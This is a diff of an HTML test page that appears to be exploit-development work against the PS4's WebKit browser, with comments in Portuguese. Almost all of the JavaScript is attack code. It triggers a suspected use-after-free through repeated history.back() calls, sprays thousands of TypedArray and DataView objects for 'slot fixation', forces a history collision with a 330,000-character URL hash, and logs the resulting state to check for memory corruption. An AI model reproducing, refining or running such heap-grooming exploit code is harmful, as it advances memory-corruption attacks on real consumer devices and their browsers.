@@ -1,91 +1,115 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – History Slot Fixation Probe</title>
-<style>
-body { background:#000; color:#0f0; font-family:monospace; }
-button { padding:12px; font-size:16px; margin:10px 0; }
-#log { white-space:pre-wrap; border:1px solid #0f0; padding:10px; }
-</style>
+<title>PS4 WebKit – Slot Fixation V2</title>
 </head>
 <body>
 
-<h2>History Entry Slot Fixation – Final Probe</h2>
-<button onclick="run()">RUN SLOT FIXATION TEST</button>
-<div id="log"></div>
+<h1>Slot Fixation V2 – TypedArray Header Capture</h1>
+<button onclick="run()">RUN TEST</button>
+<pre id="log"></pre>
 
 <script>
-const logEl = document.getElementById("log");
-const log = m => logEl.textContent += m + "\n";
-const sleep = ms => new Promise(r => setTimeout(r, ms));
+function log(s) {
+    document.getElementById("log").textContent += s + "\n";
+}
 
-async function triggerUAF(){
-    let size = 977;
-    const STEP = 14461;
-
+/* ================================
+   UAF TRIGGER (INALTERADO)
+================================ */
+async function triggerUAF() {
     log("=== UAF TRIGGER START ===");
+    for (let i = 0; i < 48; i += 6) {
+        history.back();
+        log("[ITER " + i + "] back() async");
+        await new Promise(r => setTimeout(r, 1));
+    }
+    log(">>> UAF WINDOW <<<");
+}
 
-    for(let i=0;i<48;i++){
-        let frag = "A".repeat(size);
-        history.pushState({i}, "", "#"+frag);
-        history.replaceState({i}, "", "#"+frag.slice(0, frag.length>>1));
-        if(i % 6 === 0){
-            setTimeout(()=>history.back(),0);
-            log(`[ITER ${i}] back() async`);
-        }
-        size += STEP;
-        await sleep(5);
+/* ================================
+   SLOT FIXATION V2
+   (CORREÇÃO REAL)
+================================ */
+function allocateSlotFixers() {
+    log("\n=== SLOT FIXATION PHASE (V2) ===");
+
+    let keep = [];
+
+    /* 1️⃣ Zero-length TypedArray headers */
+    for (let i = 0; i < 2000; i++) {
+        keep.push(new Uint8Array(0));
     }
 
-    log(">>> UAF WINDOW <<<");
-    await sleep(120);
+    /* 2️⃣ Minimal ArrayBuffer-backed views */
+    for (let i = 0; i < 2000; i++) {
+        keep.push(new DataView(new ArrayBuffer(16)));
+    }
+
+    /* 3️⃣ Small typed arrays matching JSCell allocator */
+    for (let i = 0; i < 2000; i++) {
+        keep.push(new Uint16Array(1));
+    }
+
+    log("Allocated TypedArray/DataView headers: " + keep.length);
+    return keep;
 }
 
-function occupySmallSlot(){
-    // Candidatos clássicos a ocupar ~32B
-    let o1 = {a:1};
-    let o2 = {b:2};
-    let o3 = Object.create(null);
-    let o4 = {x:0,y:0,z:0};
-    return [o1,o2,o3,o4];
+/* ================================
+   CONTROLLED HISTORY COLLISION
+================================ */
+function controlCollision() {
+    log("\n=== CONTROL COLLISION ===");
+
+    let small = "#A";
+    let large = "#" + "B".repeat(330000);
+
+    history.replaceState({ctrl: "A"}, "", small);
+    history.replaceState({ctrl: "B"}, "", large);
+
+    history.back();
 }
 
-async function run(){
-    logEl.textContent = "";
+/* ================================
+   MAIN TEST
+================================ */
+async function run() {
+    document.getElementById("log").textContent = "";
+
+    /* Baseline */
+    log("=== BASELINE ===");
+    log("URL.length = " + location.href.length);
+    log("history.state = " + JSON.stringify(history.state));
+    log("history.length = " + history.length);
+
     await triggerUAF();
 
-    log("\n=== BASELINE ===");
-    log("URL.length = " + document.URL.length);
-    log("history.state = " + JSON.stringify(history.state));
-    log("history.length = " + history.length);
+    /* Fix slot */
+    let slotKeepAlive = allocateSlotFixers();
 
-    log("\n=== SLOT REUSE PHASE ===");
-    let slots = [];
-    for(let i=0;i<5000;i++){
-        slots.push(occupySmallSlot());
-    }
-    log("Allocated small objects: " + slots.length);
+    /* Collision */
+    controlCollision();
 
-    log("\n=== CONTROL COLLISION ===");
-    history.replaceState({ctrl:"A"}, "", "#X");
-    history.replaceState({ctrl:"B"}, "", "#"+"B".repeat(680644));
-    history.back();
+    /* Observe */
+    setTimeout(() => {
+        log("\n=== POST ===");
+        log("URL.length = " + location.href.length);
+        log("hash.length = " + location.hash.length);
+        log("history.state = " + JSON.stringify(history.state));
+        log("history.length = " + history.length);
 
-    await sleep(50);
+        let ctrl = history.state ? history.state.ctrl : undefined;
+        log("\n=== CONSISTENCY CHECK ===");
+        log("Final ctrl = " + ctrl);
+        log("=== TEST END ===");
 
-    log("\n=== POST ===");
-    log("URL.length = " + document.URL.length);
-    log("hash.length = " + location.hash.length);
-    log("history.state = " + JSON.stringify(history.state));
-    log("history.length = " + history.length);
-
-    log("\n=== CONSISTENCY CHECK ===");
-    log("Final ctrl = " + history.state?.ctrl);
-    log("=== TEST END ===");
+        /* Prevent GC */
+        window.__keep = slotKeepAlive;
+    }, 50);
 }
-
-log("Ready.");
 </script>
+
 </body>
 </html>
